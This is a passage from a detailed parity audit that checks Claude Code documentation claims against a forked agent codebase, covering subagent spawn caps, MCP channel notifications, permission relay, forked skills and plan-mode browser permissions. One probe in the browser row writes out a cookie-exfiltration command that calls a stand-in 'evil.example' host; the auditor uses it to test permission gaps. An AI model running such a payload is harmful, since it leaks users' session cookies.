(permissions-config.ts:8 'Workspace: CONFIG_DIR/workspaces/{slug}/permissions.json' and per-source; loadWorkspacePermissionsConfig :698 applied :1107, allowedTools pushed :1252), so scoping IS reachable per invocation: `--workspace <slug>` selects the workspace whose permissions.json carries the list, and `--source` scopes the enabled capability/MCP tool set per run. pre-tool-use.ts adds two more floors bypass does not skip — `requiresUserInteraction` (:1161-1169, 'even in ... bypassPermissions') and the rm -rf / circuit breaker (:1186-1200, 'unlike EVERY other gate in this file it is NOT skipped'). So 'no per-invocation tool scoping' and 'running unrestricted' are both wrong; what is actually missing is only the one-flag ergonomic. (4) PAGE SCOPE: best-practices is row 115 of docs/superpowers/specs/2026-07-31-claude-coverage-map.md, verdict ⬜ in the section 'Вне продукта — платформы, IDE, облака, онбординг' — a tips page grouped with common-workflows and champion-kit. column5: Added a per-session cap on subagent spawns (default 200, override with `CLAUDE_CODE_MAX_SUBAGENTS_PER_SESSION`) to stop runaway delegation loops; `/clear` resets the budget
column6: A per-session subagent spawn cap (default 200) and a concurrent-subagent cap (default 20) bound runaway delegation.
column7: Neither cap exists. `grep -ran -e 'MAX_SUBAGENTS_PER_SESSION' -e 'MAX_CONCURRENT_SUBAGENTS' packages apps` → 0 hits. The spawner bounds only depth (`DEFAULT_MAX_DEPTH = 1`) and a global concurrency semaphore (`DEFAULT_CONCURRENCY`, default 16 per packages/pi-agent-server/README.md:46) — a semaphore throttles simultaneity but never caps total spawns, so a session can spawn unboundedly many subagents in sequence.
column9: Doc sentence is verbatim (changelog.md:207, Update 2.1.212, July 17 2026); the whole line is one bullet and the trailing clause ('/clear resets the budget') does not reverse it. The companion concurrent cap is also verbatim at changelog.md:101 (default 20, CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS). The grep for CLAUDE_CODE_MAX_SUBAGENTS_PER_SESSION / MAX_CONCURRENT_SUBAGENTS really does return 0 hits, and the cited packages/pi-agent-server/src/orchestrator/spawner.ts:604 really does read 'concurrency: cfg.concurrency ?? DEFAULT_CONCURRENCY'. But the CONSEQUENCE is false, and the finding stopped exactly one line short: spawner.ts:603 is 'fanout: cfg.maxFanout ?? 100'. That budget IS the per-session total-spawn cap. It is enforced at packages/server-core/src/pi-harness/child-session-service.ts:148 as 'if (children.length >= input.budgets.fanout) throw new Error("child-session-fanout-limit")' — against children.length, the parent's FULL record list, not the active subset computed one line earlier at :147. That list is append-only (the sole removal, :154, is the cancelled-start rollback), so a finished child still counts: this is a cumulative lifetime cap on spawns per parent session, exactly the documented semantic. Proven by packages/server-core/src/pi-harness/child-session-service.test.ts:174-184 — child-1 is stopped (twice) and then starting child-3 with 'fanout: 1, concurrency: 2' still throws 'child-session-fanout-limit'. So the claim's core assertion, 'a semaphore throttles simultaneity but never caps total spawns, so a session can spawn unboundedly many subagents in sequence', is refuted by a passing test. The second cap is also present and also missed: child-session-service.ts:149 'if (active.length >= input.budgets.concurrency) throw new Error("child-session-concurrency-limit")' is a per-parent CONCURRENT-subagent cap enforced on the host, in addition to (not the same as) the process-wide DEFAULT_CONCURRENCY semaphore the finding described. Shipped defaults come from DEFAULT_PI_ORCHESTRATOR_CONFIG (packages/shared/src/agent/pi-harness/harness-manifest.ts:102-112): maxAgents 1000, concurrency 16, wired maxAgents -> maxFanout -> budgets.fanout at packages/pi-agent-server/src/index.ts:1280; packages/pi-agent-server/README.md:49 documents maxAgents as the 'Runaway backstop: maximum agent() calls per workflow run'. SessionManager narrows further on specific paths (fanout: min(parentBudgets?.fanout ?? 1, 1) for hook-effect children at SessionManager.ts:4933; fanout: 1 for the judge at :11217; min-with-inherited at :11142). Finally, the absent identifiers are the expected shape of this fork, not a gap: Nessy is renamed throughout (NESSY_ prefixes, @nessy-agent scope, Pi orchestrator), so CLAUDE_CODE_* env names would not exist even where the behaviour matches — a textbook 'identically-named symbol in a sibling subsystem' inversion. Nothing in docs/superpowers/specs/2026-07-29-inert-worklist.md section 3 covers this; the refutation is on evidence, not on a recorded decision.

column5: A channel is an MCP server that pushes events into your running Claude Code session, so Claude can react to things that happen while you're not at the terminal.
column6: A channel event pushed while the user is away reaches the session and Claude reacts to it; several events arriving during a busy turn are delivered together on the next turn.
column7: An event arriving while the session is IDLE is silently discarded. `packages/server-core/src/sessions/SessionManager.ts:2436` subscribes with `({ text }) => { ...; canDeliver()?.redirect(text) }`, and `canDeliver()` at `:2399-2405` returns `undefined` unless `managed.isProcessing && agent.isProcessing?.()`. There is no queue and no idle wake for this path: the R3 grouping/idle-wake delivery that DOES cite this contract (`packages/server-core/src/sessions/task-notification.ts:46-51`, "delivered together on the next turn ... one delivery, in arrival order") is wired to monitor events only, never to `subscribeChannel`. Events during a busy turn are also not grouped — each is steered in immediately.
column9: All three checks pass and no refutation ground applies.  (1) DOC, verbatim. `curl -sL https://code.claude.com/docs/en/channels.md` line 13 carries the quoted sentence exactly. The whole line is three sentences and the remainder does NOT reverse it: "Channels can be two-way: Claude reads the event and replies back through the same channel, like a chat bridge. Events only arrive while the session is open, so for an always-on setup you run Claude in a background process or persistent terminal." The only stated precondition is that the SESSION IS OPEN — not that a turn is in flight. The grouping half of the claimed behaviour is not on this page but is verbatim on `channels-reference.md:256`: "Events queue into the session and are processed in order. If several notifications arrive while Claude is busy, they're delivered together on the next turn and Claude handles them as a group."  (2) CODE, as cited. `packages/server-core/src/sessions/SessionManager.ts:2436` is `managed.mcpChannelUnsubscribe = pool.subscribeChannel(leaserId, ({ text }) => { if (managed.mcpLeaserId !== leaserId) return; canDeliver()?.redirect(text) })`, and `canDeliver` at `:2399-2405` is `if (current !== managed || !agent || !managed.isProcessing || !agent.isProcessing?.()) return undefined` plus a capability-generation check. Exactly as claimed, line numbers included. (Nit, non-material: the `task-notification.ts` docblock the finding quotes is at `:47-52`, not `:46-51`; the quoted text is present.)  (3) CONSEQUENCE, verified separately from the identifier, and it is not an upstream-handled or sibling-subsystem confusion. There is no queue below: `mcp-pool.ts:714 subscribeChannel` only adds a listener, `:758 applyChannelPolicy` installs a pass-through dispatcher, nothing buffers. There is no idle wake above: `deliverMonitorEvent`/`flushPendingTaskNotifications` (`SessionManager.ts:2660`, `:2677`) — the R3 three-rule discipline whose docblock at `:2649-2651` literally says the other out-of-turn producer `armPiPluginPeripherals` "can only steer a LIVE turn, so an event arriving between turns was dropped outright" — has exactly three producers: `SessionMonitorService` (`:3603`), the cron service (`:2749`) and R10 `task_notification` (`:18240`). `subscribeChannel` is not among them. The repo's own shipped test asserts the drop as intended-for-now: `packages/server-core/src/sessions/__tests__/mcp-channel-gate.test.ts:90-106`, "still drops a push when no turn is in flight", with an enabled policy and an idle session expecting `redirected` to be `[]`. Grouping is likewise absent on this path — each event is `redirect(text)`-ed individually into the running turn.  Not an owner decision. `docs/superpowers/specs/2026-07-29-inert-worklist.md` §3 lists nine dated decisions; none is this. The only channel row there is `isManagedChannelServerAllowed` under "cosmetic", a different symbol with a different (refuted) consequence. What the repo does record is the OPPOSITE of a keep-decision: `docs/superpowers/plans/2026-07-26-sandbox-and-managed-policy.md:104-106` scopes it out of P10 only — "Today a push is dropped when no turn is in flight. That drop is the only thing making the current no-gate state survivable. Do not touch it in this plan" — and the parity audit at `2026-07-25-nessy-claude-parity-audit.md:1167` says "The no-turn drop is the invariant a later feature will want to remove." Scoped out of one plan pending the security gate is not the same as decided-to-keep.  Not a deliberate product difference either. The fork did not drop channels the way it drops Claude/ChatGPT subscription flows: the channel push path is implemented generically for any MCP server (`mcpChannelPushEnabled` + `resolveManagedChannelPolicy`, `channelsEnabled`/`allowedChannelServers`), and the coverage map already grades the page 🟨 "код есть (10 файлов, 4 с тестами)". The divergence is in delivery semantics of a feature we do ship, not in its absence.

column5: Your server emits `notifications/claude/channel` with two params:
column6: The channel notification method is `notifications/claude/channel`, and its params are `content` (string) and optional `meta` (Record<string,string>).
column7: Both the method and the payload field are different. `packages/shared/src/mcp/client.ts:112-114` registers `NotificationSchema.extend({ method: z.literal('claude/channel') })` — no `notifications/` prefix — and the handler at `:357-361` reads `(notification.params as { text?: unknown }).text`, ignoring `content` and `meta` entirely. `grep -ran 'notifications/claude' --exclude-dir=node_modules .` returns zero hits repo-wide, so a conforming channel server's notifications match no handler and are dropped silently. This is the same rename class as the `input.lsp`/`lspServers` bug AGENTS.md records.
column9: All three checks confirm the finding. (1) The quoted sentence exists verbatim: channels-reference.md line 225 is exactly 'Your server emits `notifications/claude/channel` with two params:' — a one-sentence line, followed by a table whose rows are `content` (string, 'The event body') and `meta` (Record<string,string>, optional, becomes attributes on the <channel> tag). Line 48 ('Emit `notifications/claude/channel` events when something happens') and line 221 ('call `mcp.notification()` with method `notifications/claude/channel`') say the same thing; the page uses the un-prefixed string `claude/channel` only as the CAPABILITY key (`capabilities.experimental: { 'claude/channel': {} }`, line ~101). The page is a legitimate Claude contract source: it is row 67 of scripts/claude-doc-pages.tsv. (2) The cited code says what was claimed: packages/shared/src/mcp/client.ts:112-114 is `const ClaudeChannelNotificationSchema = NotificationSchema.extend({ method: z.literal('claude/channel') })` and :357-361 is `setNotificationHandler(ClaudeChannelNotificationSchema, notification => { const text = (notification.params as { text?: unknown } | undefined)?.text; ... })`. `grep -ran 'notifications/claude' packages apps scripts` (with -a, NUL-safe) returns 0 hits; the only repo hits are the sweep documents themselves in docs/. Every other notification this same client registers carries the prefix (ToolListChangedNotificationSchema = 'notifications/tools/list_changed'), which is what makes the un-prefixed literal a rename-class miss rather than a style choice. (3) The CONSEQUENCE was verified separately from the identifier, both one layer up and one layer down. Down: MCP SDK dispatch keys on the exact method string — protocol.js:274 `this._notificationHandlers.get(notification.method) ?? this.fallbackNotificationHandler`, with `if (handler === undefined) return;` under the comment 'Ignore notifications not being subscribed to'; setNotificationHandler registers under `getMethodLiteral(schema)`. No `fallbackNotificationHandler` is set anywhere in packages/ or apps/, and the custom SupervisedStdioClientTransport (client.ts:820-840) deserializes and forwards frames unmodified — there is no compat shim rewriting the method. So a conforming server's notification is dropped with no error, exactly as claimed. Up: the consumer chain is McpChannelMessage { server, text } -> NessyMcpClient.channelHandler -> McpClientPool.dispatchChannelMessage (mcp-pool.ts:1082) guarded by isMcpChannelMessage (:370, requires `message.text` to be a string) -> SessionManager channel listener; nothing anywhere reads `content` or `meta`, so even a server that used the un-prefixed method would still be ignored unless it sent `text`. Not an owner decision: inert-worklist.md section 3's nine dated decisions contain no channel-method row (its only channel item is `isManagedChannelServerAllowed`, a different symbol in the managed-policy subsystem, listed in section 4 as a consequence-false false positive). Not a deliberate product difference either — this is a wire method on the MCP protocol, not a NESSY_ rebrand surface, and the code already names it `claude/channel`; the feature is explicitly modeled on Claude channels (storage.ts:1142 'Whether a connected MCP server may push text into a live turn through the `claude/channel` notification'). The parity audit already grades this area 'partial' rather than parity (2026-07-25 audit line 1764). Two bounding caveats that do not refute it: channel push is fail-closed (`mcpChannelPushEnabled` defaults false, CHANNEL_PUSH_OFF), so no user is affected until they opt in; and the claim's own line 'grep returns zero hits repo-wide' is now true only for source — docs/ quotes the string.

column5: The event arrives in Claude's context wrapped in a `<channel>` tag. The `source` attribute is set automatically from your server's configured name:
column6: The event reaches the model wrapped in a `<channel>` tag whose `source` attribute is the server's name, with each `meta` key as a further attribute.
column7: No wrapping at all. The pool does carry the server slug (`packages/shared/src/mcp/client.ts:102-105`, `McpChannelMessage { server, text }`), but the consumer throws it away: `packages/server-core/src/sessions/SessionManager.ts:2436` destructures `({ text })` and calls `canDeliver()?.redirect(text)`, which reaches `PiAgent.redirect` (`packages/shared/src/agent/pi-agent.ts:7086-7095`) and is sent verbatim as a `steer` message. The model cannot tell which channel an event came from, and there is no attribute channel for routing keys like `chat_id` — which makes the documented two-way reply pattern ("passing the chat_id from the tag") unimplementable against us.
column9: All three checks pass; the claim survives. (1) QUOTE VERBATIM. `curl -sL https://code.claude.com/docs/en/channels-reference.md` line 244 reads exactly: "The event arrives in Claude's context wrapped in a `<channel>` tag. The `source` attribute is set automatically from your server's configured name:" Both sentences on that line support the claim; the second half does not reverse it. The immediately following fenced block (`:246-250`) shows `<channel source="your-channel" severity="high" run_id="1234">` with the body inline, and the `meta` row of the notification-format table (`:229`) says "Each entry becomes an attribute on the `<channel>` tag for routing context like chat ID, sender name, or alert severity." The two-way pattern the claim invokes is also verbatim on the page (`:322`, `:350`, `:619`): "Reply with the reply tool, passing the chat_id from the tag." The page is row 67 of `scripts/claude-doc-pages.tsv`, so it is a legitimate Claude Code contract source. (2) CITED SITE CONFIRMED. `packages/server-core/src/sessions/SessionManager.ts:2436-2439` is verbatim `managed.mcpChannelUnsubscribe = pool.subscribeChannel(leaserId, ({ text }) => { if (managed.mcpLeaserId !== leaserId) return; canDeliver()?.redirect(text) })` — the destructure drops `server`, exactly as claimed. (3) ONE LAYER UP AND DOWN, CONSEQUENCE VERIFIED SEPARATELY. Up: `packages/shared/src/mcp/mcp-pool.ts:1082-1105` (`dispatchChannelMessage`) hands listeners the whole `{ server, text }`, so the slug is available and it is the consumer that discards it — nothing upstream has already wrapped. Further up, `packages/shared/src/mcp/client.ts:357-361` builds the message from `(notification.params as { text?: unknown }).text` only; `meta` is never read, so the attribute payload never even enters the process — the 'no attribute channel for chat_id' half of the claim is true at the source, not merely at the consumer. Down: `PiAgent.redirect` sends `{ type: 'steer', message }` unchanged, and `packages/pi-agent-server/src/index.ts:4329-4333` calls `piSession.steer(msg.message)` verbatim — no wrapping in the subprocess either. Positive control for the absence claim: `grep -rna '<channel' packages apps --include='*.ts' --include='*.tsx'` returns only four unrelated CLI usage strings (`apps/cli/src/index.ts:918,940,2079,2080`); `-a` was used because this repo has NUL-carrying files. The only `source="..."` tag builders in the tree are `source-manager.ts:250` (`<source_issue>`) and `guardian.ts:296` (`<untrusted source=...>`), and the latter is reachable only from the auto-mode guardian prompt (`guardian.ts:312`, `:394`), never from the steer path — so the sibling-subsystem mirror does not apply. NOT AN OWNER DECISION: the nine dated decisions in `2026-07-29-inert-worklist.md` §3 are the seatbelt wildcard, `availableModels`/`enforceAvailableModels`, `autoMode.classifyAllShell`, `ManagedDeliveryStateV1.drops`, `plugins/hooks-runtime.ts`, `SdkMcpServerConfig.required`, `SessionMirrorStore.delete`, `MirrorSessionKey.subpath`, and `listSessionSummaries` — none touches channel rendering. NOT A DELIBERATE PRODUCT DIFFERENCE: channels are implemented here (the `claude/channel` handler, `ChannelPolicy`, `allowedSources`, the `channelsEnabled` managed key), and the parity audit itself records the surface as knowingly incomplete — `2026-07-25-nessy-claude-parity-audit.md:1764` §6.5 "`claude/channel`, `parity` vs `partial` — **partial**" — which is an acknowledged gap, not a refutation. Two notes that do not change the verdict: (a) the claim's line range for `PiAgent.redirect` has drifted — the override is at `packages/shared/src/agent/pi-agent.ts:7109`, not `:7086-7095`, which now falls inside `forceAbort`; the named symbol and its behaviour are correct. (b) This finding overlaps f135 (method `claude/channel` vs the documented `notifications/claude/channel`, and `params.text` vs `content`/`meta`) but is not subsumed by it: even if the method matched, nothing in the chain would build the tag.

Like the [channel notification](#notification-format), the transport is standard MCP but the method and schema are Claude Code extensions. The `params` object has four string fields your server formats into the outgoing prompt:
column6: A channel declaring `capabilities.experimental['claude/channel/permission']` receives `notifications/claude/channel/permission_request` (request_id/tool_name/description/input_preview) and answers with `notifications/claude/channel/permission` (request_id/behavior).
column7: The entire permission-relay half is absent. `grep -ran 'channel/permission' --exclude-dir=node_modules --exclude-dir=.git .` → 0 hits; `grep -ran 'permission_request' packages apps` matches only our own internal renderer event type (`packages/core/src/types/message.ts:962`), which is unrelated. Nothing declares or reads the `claude/channel/permission` capability, nothing emits the outbound request, and nothing accepts a remote verdict — so a channel plugin built to relay approvals gets no prompts and a paused session cannot be unblocked remotely.
column9: Step 1 PASSES: the quoted sentence exists verbatim at channels-reference.md:463, and the whole line plus the two lines around it (:474 'The verdict your server sends back is notifications/claude/channel/permission with two fields: request_id ... and behavior', :199 the capabilities.experimental['claude/channel/permission'] row) confirm rather than reverse the claimed behaviour. Step 2 PASSES on substance, drifts on the cite: grep -ran 'channel/permission' over source returns nothing (positive control: the same grep for 'claude/channel' DOES find the sibling half at packages/shared/src/mcp/client.ts:113, config/storage.ts:95, mcp/mcp-pool.ts, so the grep works and the absence is real); grep -ran 'notifications/claude' over packages+apps is likewise empty. The cited packages/core/src/types/message.ts:962 is off by 13 lines (permission_request is at :975, permission_request_cancelled at :989; :962 is a comment header), and the claimed evidence '0 hits' is literally false as written -- the same command returns 16 hits, all of them the sweep's own rows in docs/superpowers/specs/. Step 3 REFUTES the finding on its consequence, which is the exact shape 2026-07-29-inert-worklist.md sec.4 item 3 warns about ('the identifier really is unwired, but the consequence is false because something else already handles it' -- and its example is also a channel row). The finding asserts 'a paused session cannot be unblocked remotely'. That is false: Nessy's own wire protocol relays every permission prompt to every connected client and accepts the verdict back from any of them. packages/shared/src/protocol/dto.ts:377-378 carries permission_request / permission_request_cancelled as server events; RPC_CHANNELS.sessions.RESPOND_TO_PERMISSION (packages/shared/src/protocol/channels.ts:38) is handled at packages/server-core/src/handlers/rpc/sessions.ts:462 and, decisively, is a member of REMOTE_ELIGIBLE_CHANNELS (packages/shared/src/protocol/routing.ts:242 declares the set, :283 lists RESPOND_TO_PERMISSION) -- so apps/cli attached to a remote nessy-server can answer a paused session's prompt over the network. A remote-approval path exists; the MCP-channel-shaped one does not. Second, the 'channel plugin' framing names an already-recorded deferral rather than a new gap: a plugin's channels field is a deliberately retained-but-deferred surface (packages/shared/src/plugins/format-adapters/claude.ts:2271, { externalKind: 'channel', field: 'channels' } -> reasonCode plugin.deferred.claude_channel), and the deviation register already records it ('channels are still a wholly deferred surface here', 2026-07-29-deviation-register.md:264), which is the one deviation the coverage map counts for this page (2026-07-31-claude-coverage-map.md:127). Not one of the nine dated owner decisions in inert-worklist sec.3, and not a rebrand/subscription-drop product difference. Adjacent, and bigger than f137 but out of its scope: our inbound half does not match the page's wire contract either -- client.ts:113 registers z.literal('claude/channel') and reads params.text, while channels-reference.md:236 specifies method 'notifications/claude/channel' with params { content, meta }.

column5: {/* min-version: 2.1.218 */}A forked skill runs in the background by default; set `background: false` in its frontmatter to run it in the foreground, where the invoking turn waits for the result. Before v2.1.218, forked skills always ran in the foreground.
column6: A skill can run in a forked subagent via `context: fork`, and `background: false` in its frontmatter runs that fork in the foreground — which is what decides whether rewind restores its edits.
column7: Neither key is honoured. `packages/session-tools-core/src/validation.ts:212-221` lists the parsed skill fields and `context`/`background` are not among them; they sit in the separate "documented SKILL.md keys this runtime PARSES NOTHING FROM" block at `:224-236`, whose only effect is suppressing the unknown-field warning. The field's own comment states the gap: "`context: fork` and its dependent `background` need a forked-subagent skill context, which does not exist". So the distinction this page's restore rule turns on cannot be expressed. Already recorded as inert contract #25 in docs/superpowers/specs/2026-07-29-inert-contracts.md:97.
column9: (1) VERBATIM — PASSES. `curl -sL https://code.claude.com/docs/en/checkpointing.md` (112 lines, fetched 2026-08-02) line 84 contains the quoted sentence word for word, including the `{/* min-version: 2.1.218 */}` marker. Read whole, the line is: "Except for a [skill with `context: fork`](/docs/en/skills#run-skills-in-a-subagent) that runs in the foreground, edits a [subagent](/docs/en/sub-agents) applies land outside your session's checkpoints, so rewinding doesn't restore them ... This includes a background `/code-review --fix` run and any forked skill that runs in the background. Use git to revert those edits. The foreground fork edits your working tree during your own turn, so rewinding restores its edits as usual. {/* min-version: 2.1.218 */}A forked skill runs in the background by default; set `background: false` ... Before v2.1.218, forked skills always ran in the foreground." Nothing in the second half reverses it. (2) CITED LINE — PASSES ON THE IDENTIFIER, FAILS ON THE MECHANISM. `packages/session-tools-core/src/validation.ts:212-221` is `DOCUMENTED_SKILL_FIELDS` and neither `context` nor `background` is in it, as claimed; the quoted comment sits at :234-:237. But the claim that the second block's "only effect is suppressing the unknown-field warning" is FALSE ON HEAD. Those keys are in `IGNORED_SKILL_FIELDS` (:246-:251), and its only consumer, validation.ts:351-:358, emits a DEDICATED warning — "'<key>' is a documented field this runtime does not implement — it will be ignored", suggestion "Remove it or expect no effect: it only applies with 'context: fork', which is not implemented" — instead of the generic "Unknown frontmatter field" one, pinned by validation.test.ts:59-:73 ("warns on a documented field this runtime ignores, and says which"). The finding inherited that wording from inert-contracts.md:97 row 25, which is itself STALE: it still places the four keys in `DOCUMENTED_SKILL_FIELDS` at :218 and describes the suppress-only behaviour that unit U-E (commit 55b711ce) removed. So the citation of #25 as our current state is out of date. (3) CONSEQUENCE — REFUTED, and this is the trap the audit history names. The claim's own words are "the distinction this page's restore rule turns on cannot be expressed". The distinction this page's rule turns on is fork-child vs named-subagent, and it IS expressed and implemented here, by a different mechanism: `SessionManager.revertForkChildCheckpoints` (packages/server-core/src/sessions/SessionManager.ts:13742, called from `rewindToMessage` at :13841) walks the checkpoints of children with `restrictions.fork === true` and reverts them, while a named subagent's stay in the child's own manifest untouched. Pinned by packages/server-core/src/sessions/fork-parent-scope.test.ts:123-:161, "restores a fork child's file edit and leaves a named subagent's alone", and already written up at docs/architecture/file-checkpoint-rewind.md:99-:115 ("**The fork exception now holds too** ... exactly the documented split"). The foreground/background axis exists too, one subsystem over: orchestrator/subagent-tool.ts:451-:470 resolves `background` per spawn (fork mode forces background, `NESSY_DISABLE_BACKGROUND_TASKS` forces foreground, an explicit argument wins) and spawner.ts:496-:520 mirrors it. What is genuinely missing is only the SKILL-FRONTMATTER ENTRY POINT into that fork: no code reads a skill's `context`/`background` (checked with `grep -arn`, NUL-safe, across packages/shared/src/skills/, capabilities/, and format-adapters/claude.ts — the only `background` there, claude.ts:942, is an AGENT field). And the observable restore outcome for the exact case this page names is NOT divergent: a skill declaring `context: fork` + `background: false` is expanded inline into the main turn, so its edits are checkpointed by the main session and ARE restored by rewind — which is what the page prescribes for a foreground fork. Our behaviour is Claude's own pre-v2.1.218 behaviour ("forked skills always ran in the foreground") for every skill; only the default-background case diverges, and it diverges toward restoring more, not less. Not one of the nine dated owner decisions in inert-worklist.md section 3 (none concerns skill frontmatter) and not a Nessy product difference. The real, still-open gap is the missing skill-level isolation, which is already the subject of f062 (refuted=false, confirmed) — f138 is that same gap re-projected onto checkpointing with a consequence that does not survive the layer-up check.

column5: In [plan mode](/docs/en/permission-modes#analyze-before-you-edit-with-plan-mode), browser tool calls that only read the page or browser state run without a permission prompt, and calls that change state prompt for approval.
column6: In plan mode, read-only browser calls run without a prompt and state-changing browser calls (clicks, typing, navigation, tab/window management, GIF recording) prompt for approval.
column7: Every browser command is auto-allowed in plan mode with no inspection of what it does. `packages/shared/src/agent/mode-manager.ts:2207-2210` — inside the branch commented "Safe/Plan mode: check against read-only allowlist" — reads `if (isBrowserToolNameOrAlias(toolName)) { return { allowed: true } }`, and `plan` reaches it because `isInteractiveWritePermissionMode` (packages/shared/src/agent/mode-types.ts:98-100) covers only `default`/`acceptEdits`/`auto`. Our browser tool is a single command-string tool (`BrowserToolSchema`, packages/session-tools-core/src/tool-defs.ts:359-364), so `click`, `type`, `navigate` and `evaluate` all arrive under the same tool name and all auto-run. `packages/shared/src/agent/__tests__/browser-tools-permissions.test.ts:21` pins the current behaviour ("allows browser_tool in safe mode") without any command-level split. Claude fixed the equivalent bug in 2.1.199 ("Fixed plan mode not prompting for state-changing browser tool calls").
column9: All three checks pass. (1) DOC: `curl -sL https://code.claude.com/docs/en/chrome.md` (294 lines) carries the sentence VERBATIM at line 106 under the heading `### Browser tools in plan mode` (line 104); `grep -c -F` on the full sentence returns 1. The whole line is that one sentence — no second half reverses it. The two lines after it enumerate the split (read-only: read_page, get_page_text, find, console/network reads, screenshot; state-changing: clicks, typing, navigation, tab and window management, GIF recording) and line 110 adds the v2.1.199 refinement that a read-only call setting a state-changing input flag also prompts, and that browser_batch runs promptless only when every action inside it is read-only. (2) CODE: mode-manager.ts:2208 reads exactly `if (isBrowserToolNameOrAlias(toolName)) { return { allowed: true }; }`, inside the branch commented `// Safe/Plan mode: check against read-only allowlist` (:2192), reached by `plan` because `isInteractiveWritePermissionMode` (mode-types.ts:98-100) returns only for default/acceptEdits/auto. The tool really is a single command-string tool (BrowserToolSchema, session-tools-core/src/tool-defs.ts:359-364), and browser-tools-permissions.test.ts:21 really is `it('allows browser_tool in safe mode'` with no command-level split. (3) CONSEQUENCE, verified separately by direct probe of shouldAllowToolInMode rather than by reading the identifier: in `plan`, `browser_tool` with command `snapshot`, `click @e1`, `fill @e5 hello`, `navigate https://example.com`, `evaluate document.body.innerHTML=""` and `mcp__session__browser_tool` with `evaluate fetch('https://evil.example/?x='+document.cookie)` ALL return `{"allowed":true}` with no `requiresPermission`, while `Write` in the same mode returns allowed:false. Nothing upstream or downstream rescues it: pre-tool-use.ts contains zero occurrences of `browser` (grep -a), the only browser-specific gate before execution is the prerequisite-manager guide-read block (prerequisite-manager.ts:129-138), which is mode-independent and not a permission prompt; browser-tools.ts / browser-tool-runtime.ts contain no approval/permission path; and tool exposure is filtered only by `getBrowserToolEnabled()` (pi-agent.ts:1611), not by mode, so the tool is live in plan mode. A second, independent classification agrees with the auto-allow rather than overriding it: tool-defs.ts:1000 declares `safeMode: 'allow'` for browser_tool. Not an owner decision: `docs/superpowers/specs/2026-07-29-inert-worklist.md` has zero occurrences of `browser` (grep -ain), so this is none of the nine dated decisions in section 3. Not a deliberate product difference either: it is not a subscription flow, gateway or rename matter, and the fork ships a first-class browser automation surface with a genuine read/write command split (read-only: snapshot, find, screenshot, screenshot-region, console, network, windows, get-clipboard; state-changing: click, click-at, drag, fill, type, select, key, scroll, navigate, back, forward, upload, paste, set-clipboard, evaluate, window-resize, close, hide). The machinery to implement the split already exists on both sides: plan mode CAN prompt (mode-manager's toolRule 'ask' path returns `{allowed:true, requiresPermission:true}`, and the plan shell band is consumed at pre-tool-use.ts:1339-1352), and command-verb parsing from the same single-string input is already implemented for another purpose in `packages/server-core/src/domain/browser-tool-detection.ts:getBrowserToolCommandVerb`.

column5: **`strictPluginOnlyCustomization`**: this key passes the filter regardless of any lock, and it makes Claude Code ignore the developer's own customization, including protective hooks. No lock blocks it.
column6: `strictPluginOnlyCustomization` is a managed key that makes the client ignore the developer's own customization, including protective hooks, and no lock overrides it.
column7: No reader. `grep -ran -e 'strictPluginOnlyCustomization' packages apps` → 0 hits; it is not a field of `ManagedPiPolicyV1` (packages/shared/src/agent/pi-harness/managed-policy.ts) and the strict-key parser rejects unknown keys, so an admin document carrying it fails or drops it. column9: The quoted sentence is REAL and verbatim (claude-apps-gateway.md line 351 of 418, md5 b8b9352e0477b07a984bc6eb52061e10), and the identifier really is absent from our source (`grep -ran --exclude-dir=node_modules --exclude-dir=dist --include='*.ts' -e strictPluginOnlyCustomization packages apps` -> 0). The finding is refuted on the CONSEQUENCE, on four counts. (1) WRONG MECHANISM. The sentence sits under '#### Settings the locks don't cover' inside '### Restrict parent settings', a section that exists only because of `parentSettingsBehavior: "merge"` -- the channel by which a launching HOST process (Claude Desktop, an IDE extension, an Agent SDK app) injects settings into Claude Code. Its actual claim is that the key 'passes the filter', i.e. it is a documented HOLE in the parent-settings allowlist through which a host can strip the developer's own protection. `parentSettingsBehavior` and `parentSettings` both have 0 hits in our source, so we have no parent-settings channel and therefore no filter for the key to pass. The CLAIMED BEHAVIOUR drops 'passes the filter' -- the only page-specific half -- and reprints a warning about a bypass as a feature we failed to ship. (2) CLAIMED OUR STATE IS WRONG ABOUT OUR PARSER. It says 'the strict-key parser rejects unknown keys, so an admin document carrying it fails or drops it.' managed-policy.ts:722-733 does the opposite and says so: 'a policy authored for a NEWER client must still load here, so an unrecognised key is stripped with a warning rather than failing the document.' `refuseUnknownKeys` calls `sink.drop(key, ..., 'stripped')`; a policy carrying the key loads, and the strip is surfaced as a `ManagedPolicyDropV1`. The 'fails' branch does not exist. (3) THE SIBLING SET IS MISCOUNTED, WHICH IS WHAT MADE THE OMISSION LOOK ACCIDENTAL. The page names FIVE `allowManaged*Only` locks -- allowManagedPermissionRulesOnly, allowManagedMcpServersOnly, allowManagedHooksOnly, sandbox.network.allowManagedDomainsOnly, sandbox.filesystem.allowManagedReadPathsOnly -- and we implement all five (102 hits allowManagedDomainsOnly, 34 allowManagedReadPathsOnly, plus the three settings locks). `forceRemoteSettingsRefresh`, named in the finding as the fourth sibling, appears NOWHERE on this page (0 hits in the fetched copy) and is a refresh trigger, not a lock. And `strictPluginOnlyCustomization` is not a lock either: the page lists it among settings the locks do NOT cover. (4) NOT A NEW FINDING, AND FILED AGAINST A PAGE THAT DOES NOT SPECIFY THE KEY. It is already recorded twice with reasons: docs/superpowers/specs/2026-07-31-doc-sweep-phase2-partial.md:29 files it as `gap` against `permissions`, which is where the key is actually specified, and docs/architecture/managed-mcp-access.md:95 classifies it 'documented, not implemented -- a settings key we do not carry ... a different mechanism (plugin-only customization) that happens to appear in the same pattern table.' Also on the R-queue at 2026-07-26-r-queue-doc-verification.md:46. Secondary: the cited anchor managed-policy.ts:515 is the line `'channelsEnabled',` -- the MANAGED_PI_POLICY_KEYS array runs 501-533, so the cite lands inside the right structure but not on anything that says what was claimed. Secondary: 'no reader' is not true of the shipped product either -- the vendored Claude/Pi SDK bundle carries the key's full zod schema with its describe() text (packages/pi-agent-server/dist/index.js, gitignored build artifact; same in apps/electron/resources/pi-agent-server/index.js), so on the opt-in Claude Agent SDK path the key is known to the client we bundle. The accurate scope is 'absent from Nessy's own ManagedPiPolicyV1', not 'absent from the product'. Finally, this page as a whole is the Claude apps gateway (Bedrock / Claude Platform on AWS / Google Cloud / Microsoft Foundry, IdP SSO, per-group model access): `forceLoginMethod`, `forceLoginGatewayUrl` and Claude Desktop's `bootstrapUrl` are 0 hits each here, because this fork targets the Nestor corporate gateway with a Nestor-Token header and drops the Claude first-party login flows -- a deliberate product difference, not a coverage gap. NOT one of the nine owner decisions in 2026-07-29-inert-worklist.md section 3, so it is 